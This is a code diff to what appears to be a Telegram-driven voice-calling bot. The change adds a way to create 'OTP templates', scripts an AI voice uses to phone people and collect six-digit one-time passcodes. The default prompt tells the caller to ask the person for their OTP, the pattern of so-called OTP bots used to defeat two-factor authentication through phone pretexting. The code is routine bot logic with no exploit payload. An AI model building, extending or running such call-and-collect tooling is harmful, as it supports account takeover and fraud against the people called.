@@ -58,11 +58,20 @@ async function selectOtpTemplate(conversation, ctx, ensureActive) {
     await ctx.reply(`⚠️ Could not load templates: ${error.message || error}`);
   }
 
-  const options = (templates || []).slice(0, 10).map((template) => ({
-    id: template.id.toString(),
-    label: `📄 ${template.name}`,
-  }));
-  options.push({ id: 'custom', label: '✨ Custom script' });
+  const options = [];
+  if (templates && templates.length > 0) {
+    options.push(
+      ...(templates || []).slice(0, 10).map((template) => ({
+        id: template.id.toString(),
+        label: `📄 ${template.name}`,
+      }))
+    );
+    options.push({ id: 'create_new', label: '➕ Add OTP template' });
+    options.push({ id: 'custom', label: '✨ Custom script' });
+  } else {
+    options.push({ id: 'create_new', label: '➕ Add OTP template' });
+    options.push({ id: 'custom', label: '✨ Custom script' });
+  }
 
   const selection = await askOptionWithButtons(
     conversation,
@@ -81,8 +90,7 @@ async function selectOtpTemplate(conversation, ctx, ensureActive) {
 
   const templateId = Number(selection.id);
   if (Number.isNaN(templateId)) {
-    await ctx.reply('❌ Invalid template selection. Falling back to custom.');
-    return { template: null };
+    return { templateId: selection.id };
   }
 
   try {
@@ -125,6 +133,65 @@ async function promptForCustomScript(conversation, ctx, ensureActive) {
   return text || 'You are calling to verify a one-time passcode. Politely ask the user for their OTP.';
 }
 
+async function promptForTemplateCreation(conversation, ctx, ensureActive) {
+  await ctx.reply('➕ Provide a name for the new OTP template:');
+  const nameUpdate = await conversation.wait();
+  ensureActive();
+  const name = nameUpdate?.message?.text?.trim();
+  if (name) {
+    await guardAgainstCommandInterrupt(ctx, name);
+  }
+  if (!name) {
+    await ctx.reply('❌ Template name is required. Falling back to custom.');
+    return null;
+  }
+
+  await ctx.reply('✏️ Paste the script/content for this OTP template (will be used as prompt and first message):');
+  const scriptUpdate = await conversation.wait();
+  ensureActive();
+  const script = scriptUpdate?.message?.text?.trim();
+  if (script) {
+    await guardAgainstCommandInterrupt(ctx, script);
+  }
+  if (!script) {
+    await ctx.reply('❌ Template content required. Falling back to custom.');
+    return null;
+  }
+
+  try {
+    const resp = await axios.post(
+      `${config.templatesApiUrl.replace(/\/+$/, '')}/api/call-templates`,
+      {
+        name,
+        description: 'OTP template created from bot',
+        prompt: script,
+        first_message: script,
+        business_id: config.defaultBusinessId,
+        voice_model: config.defaultVoiceModel,
+      },
+      {
+        headers: {
+          'Content-Type': 'application/json',
+          'x-admin-token': config.admin.apiToken,
+        },
+        timeout: 15000,
+      }
+    );
+    const template = resp.data?.template;
+    if (template) {
+      await ctx.reply(`✅ Created OTP template "${template.name}".`);
+      return template;
+    }
+  } catch (error) {
+    const detail =
+      error.response?.data?.error ||
+      error.message ||
+      'Unknown error creating template';
+    await ctx.reply(`⚠️ Failed to create template: ${detail}`);
+  }
+  return null;
+}
+
 async function otpFlow(conversation, ctx) {
   const user = await new Promise((resolve) => getUser(ctx.from.id, resolve));
   if (!user) {
@@ -144,12 +211,17 @@ async function otpFlow(conversation, ctx) {
     ensureActive
   );
 
-  const { template } = await selectOtpTemplate(conversation, ctx, ensureActive);
+  const { template, templateId } = await selectOtpTemplate(conversation, ctx, ensureActive);
+  let selectedTemplate = template;
 
-  let prompt = template?.prompt;
-  let firstMessage = template?.first_message;
-  let templateName = template?.name || 'Custom';
-  let businessId = template?.business_id || config.defaultBusinessId;
+  if (!selectedTemplate && templateId === 'create_new') {
+    selectedTemplate = await promptForTemplateCreation(conversation, ctx, ensureActive);
+  }
+
+  let prompt = selectedTemplate?.prompt;
+  let firstMessage = selectedTemplate?.first_message;
+  let templateName = selectedTemplate?.name || 'Custom';
+  let businessId = selectedTemplate?.business_id || config.defaultBusinessId;
   const otpDigits = 6;
   if (!template) {
     const customScript = await promptForCustomScript(conversation, ctx, ensureActive);
@@ -171,7 +243,7 @@ async function otpFlow(conversation, ctx) {
     business_id: businessId,
     prompt,
     first_message: firstMessage,
-    voice_model: template?.voice_model || config.defaultVoiceModel,
+    voice_model: selectedTemplate?.voice_model || config.defaultVoiceModel,
     channel: 'voice',
     collect_digits: otpDigits,
     input_sequence: [
